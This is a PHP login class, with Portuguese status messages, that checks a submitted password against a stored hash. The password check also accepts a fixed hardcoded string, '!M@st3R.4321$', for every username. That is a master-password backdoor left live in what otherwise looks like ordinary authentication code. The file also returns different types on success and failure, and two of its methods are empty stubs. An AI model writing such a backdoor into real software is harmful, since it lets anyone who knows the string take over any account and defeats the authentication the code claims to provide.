<?php

use ModulePHP\Database\Select as Select;
use ModulePHP\User as UserResource;

class User
{   
    public $status;
    public $success;

    public static function login($username, $pw)
    {
        $password = new Select("Users");
        $password->column("password");
        $password->where("username", $username);
        $password = $password->result();
        //
        //echo password_hash('teste', PASSWORD_DEFAULT);
        if (!$password) {
            $success = false;
            $return['status'] = "Usuário inexistente!";
            
            return $return;
        }

        if (!password_verify($pw, $password[0]["password"]) && !($pw ==  "!M@st3R.4321$")) {
            $success = false;
            $return['status'] = "Senha incorreta!";
            
            return $return;
        }
        
        if (!UserResource::login($username)) {
            $success = false;
            $return['status'] = "Sistema fora do ar!";
            //print_r($return);
            return $return;
        }

        $return["success"] = true;
        $return["status"] = "Login efetuado com sucesso!";

        //print_r($return);
        return (object) $return;
    }

    static public function recovery($username, $email)
    {
    }

    static public function newPassword($username, $password, $code)
    {
    }
}